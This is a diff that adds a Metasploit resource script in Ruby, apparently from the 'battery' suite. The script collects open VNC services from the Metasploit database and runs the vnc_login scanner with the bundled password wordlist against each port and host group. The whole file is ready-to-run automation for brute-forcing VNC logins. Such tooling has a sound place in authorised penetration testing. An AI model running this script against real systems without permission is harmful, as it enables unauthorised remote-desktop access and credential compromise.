@@ -1,0 +1,57 @@
+<ruby>
+=begin
+  Name:  battery/vnc_login.rc
+    This script is intended to be used with the Metasploit Framework as a part of the battery suite of resource scripts
+    For more information see:
+      Battery Resource Scripts: https://github.com/kn0/battery
+      Metasploit Framework:  https://github.com/rapid7/metasploit-framework
+
+  Author: kn0
+    twitter: @TrentonIvey
+    email: "Trenton.Ivey@example.com".gsub(/example/,'gmail')
+    web: kn0.ninja
+
+  Description:
+    This Metasploit RC-File attempts to authenticate to target VNC services by using the vnc_passwords.txt wordlist included in metasploit.
+    It does so by using auxiliary/scanner/vnc/vnc_login against all discovered VNC services
+    Targets are chosen by matching service names with 'vnc' or ports of 5900/tcp 
+
+=end
+# Print Header
+print_status "Using auxiliary/scanner/vnc/vnc_login"
+  
+# Get a list of target services
+targets = []
+begin
+  framework.db.services.each do |service|
+    if ( (service.name =~ /vnc/i or service.port.eql? 5900) and service.state.eql? 'open' and service.proto.eql? 'tcp')
+      targets << {'ip' => service.host.address, 'port' => service.port}
+    end
+  end
+  # Remove any duplicate entries
+  targets.uniq!
+rescue ActiveRecord::ConnectionNotEstablished
+  puts "DB not connected..."
+  return
+end
+
+if targets.empty?
+  print_warning "No targets found"
+else
+  # Get a lits of unique target ports
+  target_ports = (targets.map {|t| t['port'] }).uniq
+
+  # Setup the module
+  self.run_single("use auxiliary/scanner/vnc/vnc_login")
+  self.run_single("set ShowProgress false")
+  self.run_single("set VERBOSE false")
+  
+  target_ports.each do |target_port|
+    self.run_single("set RPORT #{target_port}")
+    target_rhosts = ((targets.select {|t| t['port'].eql? target_port}).map {|t| t['ip'] }).join (" ")
+    self.run_single("set RHOSTS #{target_rhosts}")
+
+    self.run_single("run")
+  end
+end
+</ruby>
